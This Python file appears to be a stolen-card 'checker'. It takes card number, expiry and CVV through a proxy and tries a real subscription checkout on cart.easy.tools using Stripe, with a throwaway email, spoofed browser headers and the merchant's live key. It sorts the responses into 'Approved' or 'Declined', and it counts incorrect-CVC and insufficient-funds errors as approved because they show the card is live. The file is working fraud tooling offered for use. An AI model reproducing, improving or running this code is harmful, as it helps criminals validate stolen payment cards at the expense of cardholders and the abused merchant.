import requests
import uuid
from httpx import AsyncClient

async def stripeauth(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg) as web:
        email = uuid.uuid4().hex + '@gmail.com'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
        }


        reqid = await web.post('https://m.stripe.com/6', headers=headers) 

        muid = reqid.json()['muid']
        sid = reqid.json()['sid']
        guid = reqid.json()['guid']


        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json;charset=UTF-8',
            # 'cookie': '_clck=k8zr8f%7C2%7Cfrt%7C0%7C1813; _ga=GA1.1.2024162059.1734517462; _fbp=fb.1.1734517461967.990669871934064493; _clsk=gofnal%7C1734517462025%7C1%7C1%7Cs.clarity.ms%2Fcollect; _ga_10KNW449H8=GS1.1.1734517461.1.0.1734517462.0.0.0; __ca__chat=n3djg4rirc0x; _ga_KVMX7CJCL3=GS1.1.1734517465.1.0.1734517466.0.0.0; __stripe_mid=8f3d2fcc-068e-4013-9596-f92558cba05d138be4; __stripe_sid=ea0c7f05-533b-4133-9bce-8d2aca617334bc5e64; XSRF-TOKEN=eyJpdiI6InZGMnJ3ekl1N0MxZ2trazI0K05nb2c9PSIsInZhbHVlIjoibTBWbEM3cjR2Z0x2VTd0TnJDNVc1VXJ6eVB2bkxvd0dKUE1xYVM2VjA3M3pFRVAzN3FDdmxYNHBaZEFWbE5lTW0zWTVjWGZzelBERDhYRExsQ3h3VzVYV2pvRHMrcVMyY2hOdXBKVEk4RzdiWFVYTkQ5L0dIdjh1ZnFkWDB6NGQiLCJtYWMiOiI1YWMyYzdjYzBlOTljZjljMGI3NzhjN2ZmNzRmOGM4YWQ5MDE4NTIwYTY0YTYxMzdiMjgyMWI2ZWI2MDNkMmIzIiwidGFnIjoiIn0%3D; easycart_session=eyJpdiI6Ill1Qm5xdUlnRUJqT2h2YTBxUlBseFE9PSIsInZhbHVlIjoiaFlsWVJXb1dMcEFNUXdtYVl4cTFNVWRpbDl6WFRuU3dLYks1UG1rMjNCR3pJb0twMzhqVkUyc1JJdWY4Uk1oODZQRU9tVW5WUTAyUDJ5V1pYSVhiWnNJT3UrMXZuTUhVUkNJZDc5YnF5MEwxTUh3Y0NieHdjZTNQQk13dllzSVIiLCJtYWMiOiI2OTFhNjEyODBiMGZhNDMxNDRjM2JiZjBhNTFiZGQxMjgyMGUzN2MwMmVjY2JmYjNmOTNhZDJkMTRiZjc5OWI5IiwidGFnIjoiIn0%3D; easycart_checkout_session=eyJpdiI6ImhPK3F1RVZQeis5amJaZFgwRW9Nc3c9PSIsInZhbHVlIjoiUktQcnRrL0xLeldJVlgybWVHVXNkZzg1YStOYnNwV1psL2FXV2Uwd2dpTjdUb0RJcW5wY3pBaTErRW43a25vdndmQTR3SkNjOSt3ZXJ2WTRLY3k4cC9TUTgwSS9DM2UvWWdRQWV6NTNTdFk9IiwibWFjIjoiNzIxYTMxY2JmNjEwMmE2NGQ5Yjk5NjQxZGYyYmExZTFmMzgxMzE3MmRhNjk0NTU2YTYxMDQ0NDYxOTY4ZTMwZCIsInRhZyI6IiJ9',
            'origin': 'https://cart.easy.tools',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://cart.easy.tools/checkout/easy/easytools-subscription?plan=price_1QHSBJLgo5o8fS92GNc6iFvR',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'tenant_slug': 'easy',
            'data': {
                'name': 'asd sa',
                'email': email,
                'address': {
                    'state': None,
                },
            },
        }

        req1 = await web.post('https://cart.easy.tools/api/stripe/customer', headers=headers, json=json_data)

        headers = {
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = 'type=card&billing_details[name]=Alex Manreae&billing_details[email]=' + email + '&billing_details[address][postal_code]=10010&card[number]=' + cc + '&card[cvc]=' + cvv + '&card[exp_month]=' + mes + '&card[exp_year]=' + ano + '&guid=' + guid + '&muid=' + muid + '&sid=' + sid + '&pasted_fields=number&payment_user_agent=stripe.js/3f095d0677; stripe-js-v3/3f095d0677; card-element&referrer=https://cart.easy.tools&time_on_page=15401&key=pk_live_51Ir1L4EntjuGNaDGo5GHQhyZLK5zJ0Q9kDyKY3JFfSgqsrGARQwtGV6teGZ7ywO9hRHzlvegizHKM29QXyHWlgkp00Zg5vGMoX'

        req1 = await web.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        token = req1.json()['id']

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json;charset=UTF-8',
            # 'cookie': '_clck=k8zr8f%7C2%7Cfrt%7C0%7C1813; _ga=GA1.1.2024162059.1734517462; _fbp=fb.1.1734517461967.990669871934064493; _clsk=gofnal%7C1734517462025%7C1%7C1%7Cs.clarity.ms%2Fcollect; _ga_10KNW449H8=GS1.1.1734517461.1.0.1734517462.0.0.0; __ca__chat=n3djg4rirc0x; _ga_KVMX7CJCL3=GS1.1.1734517465.1.0.1734517466.0.0.0; __stripe_mid=8f3d2fcc-068e-4013-9596-f92558cba05d138be4; __stripe_sid=ea0c7f05-533b-4133-9bce-8d2aca617334bc5e64; XSRF-TOKEN=eyJpdiI6IkRoNkFtaS9XL3kzLzRNYkhaalJ2NlE9PSIsInZhbHVlIjoiQUNRVmZadGwxZkM5SVduWEdYaEdBcFpPQWdJVTBtdlA5UGFUQXhTbUlHTjM4V2x0dTBaS2RZWGlxMFc5TGprYzNnTFNaOGIyOTdnbUVnTVdBY29KaS83S0k4U3YyYklJTnJsNlpiMTAvcCtyeWJubzFhYzlhSml6ZzZhREhndC8iLCJtYWMiOiIwZTExOGJhMDNhNTJlNjhjYTZjMjczMjNmNWMwMjQ5YjU1ZWU3YmU4NGYzODgyMDQwZmQyOWY0YWYyOWZkMzhjIiwidGFnIjoiIn0%3D; easycart_session=eyJpdiI6IkJjZnhCd3FpeERNRVpCZDV5di83OFE9PSIsInZhbHVlIjoiZ3VIZnFKNW9hQ1F0UE1pNGZTaGhhTWFENG5Ja1RSbE1iRHZ5alRhTmErSkdIVGhLV0xsV1FaSEpDKzBsWXRDclhKNU10aGxjNkNxV2JDVnlrSGtBZDgyRGRJSWtCUkpuM2ZSSjZEY1NTSG54MWRha0hrV01uS3g1aDJoTkYxMEEiLCJtYWMiOiJhOWE3MzlhZjc2ODdjZDcyNzM5Njk1NGZiNTMwNDMwMTY2ZmJmYjE2MmZhYTUwMWQxZDRiYTU3MTYzZTlkOTdkIiwidGFnIjoiIn0%3D; easycart_checkout_session=eyJpdiI6ImV0R2p6SHdBc1dQcVJzejNYQkNsaUE9PSIsInZhbHVlIjoiUjJYUEMxZHc5U1VyMm10Q3Q0M2pldDdNbTFxWnhNWGF6VmM1SUV5ZzZkM1E3WkVzQnZ0anQ5SjU5L0ZQbktvYkFHeU5iVzVrZWUyY3NYMk5SUzZPdndOWTE2WE50Yit2cytFYlBXeU5zUXc9IiwibWFjIjoiNGYwMjBlYWQyN2RlZDNhYjFiMzIzZTkyNmJiMmIxY2FiM2Y5OTM4ZWI1YjRhN2NmNzU3NzljYmJlMDZlMDNlMyIsInRhZyI6IiJ9',
            'origin': 'https://cart.easy.tools',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://cart.easy.tools/checkout/easy/easytools-subscription?plan=price_1QHSBJLgo5o8fS92GNc6iFvR',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'email': email,
            'tenant_slug': 'easy',
            'stripe_price_id': 'price_1QHSBJLgo5o8fS92GNc6iFvR',
            'cross_sell': None,
            'payment_method': 'card',
            'payment_method_id': token,
            'invoice_details_id': None,
            'invoice_details': None,
            'checkboxes': {
                'newsletter': False,
                'optional': False,
                'mandatory': False,
            },
            'custom_fields': {},
            'shipping': {
                'phone': '',
                'address': '',
                'post_code': '',
                'city': '',
            },
            'quantity': 1,
            'promotion_code': None,
            'query_params': {
                'plan': 'price_1QHSBJLgo5o8fS92GNc6iFvR',
            },
            'is_delegated': False,
            'terms': True,
            'customer_data': {
                'name': 'asd sa',
                'email': email,
                'address': {
                    'state': None,
                },
            },
        }

        req2 = await web.post('https://cart.easy.tools/api/stripe/subscription', headers=headers, json=json_data)
        if "'success'" in req2.text:
            status = "Approved ✅"
            mensaje = "Approved !"
        else:
            authcode = req2.text.split('"code":"')[1].split('","message"')[0]
            message = req2.text.split('"message":"')[1].split('"}')[0]
            mensaje = f'{authcode} - {message}'
            if "incorrect_cvc" in authcode:
                status = "Approved ✅"
                mensaje = "Your card's security code is incorrect."
            elif "insufficient_funds" in authcode:
                status = "Approved ✅"
            else:
                status = "Declined ❌"

        return status,mensaje